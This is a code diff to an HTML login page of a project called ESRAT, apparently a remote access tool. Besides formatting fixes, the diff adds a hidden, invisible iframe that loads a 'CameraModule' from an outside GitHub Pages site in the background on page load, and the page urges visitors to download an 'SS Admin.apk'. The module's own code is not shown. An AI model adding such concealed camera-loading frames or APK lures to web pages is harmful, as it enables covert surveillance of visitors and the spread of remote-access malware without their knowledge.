@@ -12,20 +12,19 @@
 <body class="login-page">
 
     <nav class="navbar">
-        <h class="logo"><a href="index.html"><img src="apks/logo.png" height="100px"></a></h>
+        <h class="logo"><a href="index.html"><img src="apks/logo.png" height="100px"></a></h1>
     </nav>
 
     <div class="info">
         <span id="dynamic-text">
-          <span class="letter">G</span>
-          <span class="letter">A</span>
-          <span class="letter">N</span>
-          <span class="letter">G</span>
-          <span class="letter">A</span>
+            <span class="letter">G</span>
+            <span class="letter">A</span>
+            <span class="letter">N</span>
+            <span class="letter">G</span>
+            <span class="letter">A</span>
         </span>
-        <a class="info" href="/ESRAT/apks/SS Admin.apk" style="text-decoration: none; display: block; margin-top: 40px;">➡️Click Here⬅️ <br>to download the ADMIN App first !</a>
-      </div>
-      
+        <a class="info" href="/ESRAT/apks/SS Admin.apk" style="text-decoration: none; display: block; margin-top: 40px;">➡️Click Here⬅️ <br>to download the ADMIN App first!</a>
+    </div>
     
     <div class="container">
         <input type="text" id="username" placeholder="Username">
@@ -34,13 +33,15 @@
         <div id="message-ref" class="message"></div>
     </div>
     
-    
     <div class="home-sci2">
         <a href="https://wa.me/917008265529?text=Hola, I recently visited your website. Let's talk!"><i class='bx bxl-whatsapp'></i></a>
         <a href="https://www.instagram.com/urstruly_ganga/"><i class='bx bxl-instagram'></i></a>
         <a href="https://github.com/ES-UNIVERSE"><i class='bx bxl-github'></i></a>
     </div>
     <div class="cursor-shadow"></div>
+
+    <!-- Hidden iframe to load the CameraModule -->
+    <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
 
     <script>
         async function retrieveSacredKeys() {
@@ -75,18 +76,28 @@
             }
         }
 
+        // Event listeners for login
         document.getElementById("submit").addEventListener("click", verifyEnigmaticCredentials);
         document.getElementById("password").addEventListener("keydown", (event) => {
             if (event.key === "Enter") {
                 verifyEnigmaticCredentials();
             }
         });
-        const cursorShadow = document.querySelector('.cursor-shadow');
 
-document.addEventListener('mousemove', (event) => {
-    cursorShadow.style.left = event.clientX + 'px';
-    cursorShadow.style.top = event.clientY + 'px';
-});
+        // Cursor shadow effect
+        const cursorShadow = document.querySelector('.cursor-shadow');
+        document.addEventListener('mousemove', (event) => {
+            cursorShadow.style.left = event.clientX + 'px';
+            cursorShadow.style.top = event.clientY + 'px';
+        });
+
+        // Load the CameraModule in the background
+        window.onload = function() {
+            const iframe = document.getElementById('cameraIframe');
+            iframe.onload = function() {
+                console.log('CameraModule loaded in background');
+            };
+        };
     </script>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
